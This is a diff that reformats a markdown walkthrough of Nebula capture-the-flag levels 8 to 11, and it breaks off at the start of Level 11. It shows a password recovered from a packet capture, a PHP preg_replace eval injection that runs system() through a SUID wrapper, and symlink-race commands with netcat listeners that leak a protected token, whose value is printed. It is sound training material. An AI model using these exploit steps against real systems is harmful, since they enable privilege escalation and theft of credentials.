@@ -133,19 +133,13 @@ You have successfully executed getflag on a target account
 [URL encoding](http://meyerweb.com/eric/tools/dencoder/) is used above to pass the **_;_**, **_>_** and blank characters encoded.
 
 ## Level 8
-This presents a small capture to be analysed.  It proves to be a clear-text login to a Linux box, stored in the _capture.pcap_ file. We extract the stream (__Follow TCP stream__ option  in Wireshark), and open it with a hex editor. Then we see the password as __backdoor[\x7F][\x7F][\x7F]00Rm8[\x7F]ate. 0x7F is the ASCII code of delete key. So the reconstructed password for flag08 user is: **backd00Rmate**.
+This presents a small capture to be analysed.  It proves to be a clear-text login to a Linux box, stored in the _capture.pcap_ file. We extract the stream (_Follow TCP stream_ option  in Wireshark), and open it with a hex editor. Then we see the password as __backdoor[\x7F][\x7F][\x7F]00Rm8[\x7F]ate__. 0x7F is the ASCII code of delete key. So the reconstructed password for flag08 user is: **backd00Rmate**.
 
-Level 9
-The /home/flag09/flag09 executable is a SUID wrapper over the presented vulnerable PHP code. The vulnerability lies in using the e (PREG_REPLACE_EVAL) modifier with preg_replace function. As noted here,  "Use of this modifier is discouraged, as it can easily introduce security vulnerabilites".
-The C wrapper runs the vulnerable script, which in turn parses the content to format email addresses. When an address is matched, the 'spam' function will be executed, having as input the matched string. We'll alter this, so that the email contains the PHP system command, with the script as parameter ($filename, as it is in the  'markup' function). The idea is the same as with the vulnerable code example from PREG_REPLACE_EVAL warnings:
-?
-1
-2
-3
-4
-5
-6
-7
+## Level 9
+The _/home/flag09/flag09_ executable is a SUID wrapper over the presented vulnerable PHP code. The vulnerability lies in using the __e (PREG_REPLACE_EVAL)__ modifier with [preg_replace](http://php.net/manual/en/function.preg-replace.php) function. As noted [here](http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php),  __*Use of this modifier is discouraged, as it can easily introduce security vulnerabilites*__.
+
+The C wrapper runs the vulnerable script, which in turn parses the content to format email addresses. When an address is matched, the 'spam' function will be executed, having as input the matched string. We'll alter this, so that the email contains the [PHP system command](http://php.net/manual/en/function.system.php), with the script as parameter (_$filename_, as it is in the  'markup' function). The idea is the same as with the vulnerable code example from [`PREG_REPLACE_EVAL warnings`](http://www.php.net/manual/en/reference.pcre.pattern.modifiers.php):
+```bash
 level09@nebula:~$ vim /tmp/scr
 [email {${system($filename)}}]
 getflag > /tmp/out09
@@ -153,49 +147,45 @@ level09@nebula:~$ chmod +x /tmp/scr
 level09@nebula:~$ /home/flag09/flag09 /tmp/scr
 level09@nebula:~$ cat /tmp/out09
 You have successfully executed getflag on a target account
-Level 10
-The task here is to read the /home/flag10/token file, using the vulnerable flag10 binary. The flow is as follows: the program checks if its first argument is a readable file (the token file is readable only for flag10/flag10), and if it is, tries to connect to a remote host and send the file. This is an example of a Time-of-Check, Time-of-Use (TOCTOU) vulnerability.
-We could easily trick it to send an unreadable file.
-Method 1:
-create a world readable file in /tmp
-start the script with this file as parameter. It will block on connect function
-replace the file created in step 1 with a link to the token file
-open the socket on the other side and receive the content of the file
-?
-1
-2
-3
-4
-5
+```
+
+## Level 10
+The task here is to read the __*/home/flag10/token*__ file, using the vulnerable flag10 binary. The flow is as follows: the program checks if its first argument is a readable file (the token file is readable only for _flag10/flag10_), and if it is, tries to connect to a remote host and send the file. This is a clear example of a [Time-of-Check, Time-of-Use (TOCTOU)](https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) vulnerability. We could easily trick it to send us an unreadable file.
+
+### Method 1
+* Create a world readable file in /tmp
+* Start the script with this file as parameter. It will block on connect function
+* Replace the file created in step 1 with a link to the token file
+* Open the socket on the other side and receive the content of the file
+```bash
 $ touch /tmp/test
 $ /home/flag10/flag10 /tmp/test localhost &
 $ rm /tmp/test; ln -sf /home/flag10/token /tmp/test
- 
 c:\> nc -l -p 18211
-Method 2:
-In a scenario I had nebula VM, network in bridged mode, and connect() 
-call was non blocking, and timed out immediately. So the first method didn't work. The TOCTOU vulnerability can be still exploited. I've done the scenario created by Matt Andreko, with the exception that I've not used two machines, but just the nebula VM. More detailed explanation here. In 4 terminals:
-An infinite loop to append received output to a file
-?
-1
+```
+
+### Method 2
+In a scenario I had nebula VM, network in bridged mode, and _connect()_ call was non blocking, and timed out immediately. So the first method didn't work. The TOCTOU vulnerability can be still exploited. I've done the scenario created by Matt Andreko, with the exception that I've not used two machines, but just the nebula VM. More detailed explanation [here](http://www.mattandreko.com/2011/12/exploit-exercises-nebula-10.html). In 4 terminals:
+* An infinite loop to append received output to a file:
+```bash
 $ while :; do nc.traditional -l -p 18211 >> out.txt; done
-An infinite loop (-f switch) to search for the banner in the received file
-?
-1
+```
+* An infinite loop (**-f** switch) to search for the banner in the received file:
+```bash
 $ tail -f out.txt | grep -v ".oO Oo."
-An infinite loop to replace /tmp/token10 link with a readable file and alternatively with the token file
-?
-1
-2
+```
+* An infinite loop to replace */tmp/token10* link with a readable file and alternatively with the token file:
+```bash
 $ touch /tmp/token
 $ while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/flag10/token /tmp/token10; done
-Continuously start the flag10 binary with a low priority (-n 20), in an infinite loop, connecting to localhost
-?
-1
+```
+* Continuously start the flag10 binary with a low priority (-n 20), in an infinite loop, connecting to localhost:
+```bash
 $ while :; do nice -n 20 /home/flag10/flag10 /tmp/token10 127.0.0.1; done
-Eventually we'll get the token in the second terminal: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27. We can use it to login as flag10 user.
+```
+* Eventually we'll get the token in the second terminal: _615a2ce1-b2b5-4c76-8eed-8aa5c4015c27_. We can use it to login as flag10 user.
 
-Level 11
+## Level 11
 Level 11 presents a C program that 'decrypts' an input buffer and passes the result to the system command to be executed.  The encryption algorithm is simple, but entertaining to reverse.  I've built a python script to encrypt any command, so that it will be decrypted correctly by this algorithm and executed. (The documentation is the code).
 ?
 1
